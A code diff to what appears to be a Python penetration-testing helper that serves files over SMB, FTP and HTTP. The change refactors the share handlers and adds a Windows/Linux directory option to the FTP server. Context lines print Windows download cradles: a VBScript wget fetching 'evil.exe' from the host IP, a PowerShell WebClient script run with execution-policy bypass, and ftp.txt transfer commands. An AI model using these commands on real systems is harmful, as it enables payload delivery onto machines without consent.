@@ -9,7 +9,7 @@ from src.shares.httpserver import httpServer
 from src.shares.ftpserver import ftpServer
 from src.shares.smbserver import smbServer
 
-def share_smb(cmd=None,state=None):
+def share_smb(cmd=None):
     if len(cmd) == 2:
         if cmd[1] == "start":
             pid = os.fork()
@@ -49,23 +49,10 @@ def share_smb(cmd=None,state=None):
         return
     return
 
-def share_ftp(cmd=None,state=None):
+def share_ftp(cmd=None):
     if len(cmd) == 2:
         if cmd[1] == "start":
-            pid = os.fork()
-            if pid:
-                State.share_state["ftp"]["status"] = True
-                State.share_state["ftp"]["pid"] = pid
-                print("{}FTP Server Started!{}".format(bcolors.OKGREEN,bcolors.ENDC))
-            else:
-                try:
-                    os.chdir(Config.PATH+"/db/shares")
-                    ftpServer(Config.HOSTIP,Config.FTPPORT,Config.FTPUSER,Config.FTPPASS)
-                    return
-                except Exception as e:
-                    print("{}".format(e))
-                    print("{}".format(traceback.print_exc()))
-                    print("{}Address already in use!{}".format(bcolors.WARNING,bcolors.ENDC))
+            print("{}Usage: ftp start <windows|linux>{}".format(bcolors.WARNING,bcolors.ENDC))
         elif cmd[1] == "stop":
             if State.share_state["ftp"]["status"]:
                 os.kill(State.share_state["ftp"]["pid"], signal.SIGKILL)
@@ -86,16 +73,34 @@ def share_ftp(cmd=None,state=None):
             print("{}echo GET {{file}} >> ftp.txt{}".format(bcolors.OKBLUE,bcolors.ENDC))
             print("{}echo bye >> ftp.txt{}".format(bcolors.OKBLUE,bcolors.ENDC))
             print("{}ftp -v -n -s:ftp.txt{}".format(bcolors.OKBLUE,bcolors.ENDC))
-            
         else:
             print("{}Usage: ftp <start|stop|status|cmd>{}".format(bcolors.WARNING,bcolors.ENDC))
             return
+    elif len(cmd) == 3 and cmd[1] == "start":
+        if cmd[2] == "windows" or cmd[2] == "linux":
+            pid = os.fork()
+            if pid:
+                State.share_state["ftp"]["status"] = True
+                State.share_state["ftp"]["pid"] = pid
+                print("{}FTP Server Started!{}".format(bcolors.OKGREEN,bcolors.ENDC))
+            else:
+                try:
+                    os.chdir(Config.PATH+"/db/shares/"+cmd[2])
+                    ftpServer(Config.HOSTIP,Config.FTPPORT,Config.FTPUSER,Config.FTPPASS)
+                    return
+                except Exception as e:
+                    print("{}".format(e))
+                    print("{}".format(traceback.print_exc()))
+                    print("{}Address already in use!{}".format(bcolors.WARNING,bcolors.ENDC))
+        else:
+            print("{}Usage: ftp start <windows|linux>{}".format(bcolors.WARNING,bcolors.ENDC))
+
     else:
         print("{}Usage: ftp <start|stop|status|cmd>{}".format(bcolors.WARNING,bcolors.ENDC))
         return
     return
 
-def share_http(cmd=None,state=None):
+def share_http(cmd=None):
     if len(cmd) == 2:
         if cmd[1] == "start":
             pid = os.fork()
@@ -136,7 +141,7 @@ def share_http(cmd=None,state=None):
         print("{}Usage: http <start|stop|status|cmd>{}".format(bcolors.WARNING,bcolors.ENDC))
         return
 
-def share_vbscript(cmd=None,state=None):
+def share_vbscript(cmd=None):
     print ("""
 {}echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -167,7 +172,7 @@ echo ts.Close >> wget.vbs
 cscript wget.vbs http://{}/evil.exe evil.exe{}
     """.format(bcolors.OKBLUE,Config.HOSTIP,bcolors.ENDC))
     return
-def share_powershell(cmd=None,state=None):
+def share_powershell(cmd=None):
     print("""
 {}echo $storageDir = $pwd > wget.ps1
 echo $webclient = New-Object System.Net.WebClient >>wget.ps1
@@ -182,6 +187,6 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 switcher_share = {"smb":share_smb,"ftp":share_ftp,"http":share_http,"powershell":share_powershell,"vbscript":share_vbscript}
 
 
-def internal_share(cmd=None,state=None):
+def internal_share(cmd=None):
 
-    switcher_share.get(cmd[0],"Invalid!")(cmd,state)
+    switcher_share.get(cmd[0],"Invalid!")(cmd)
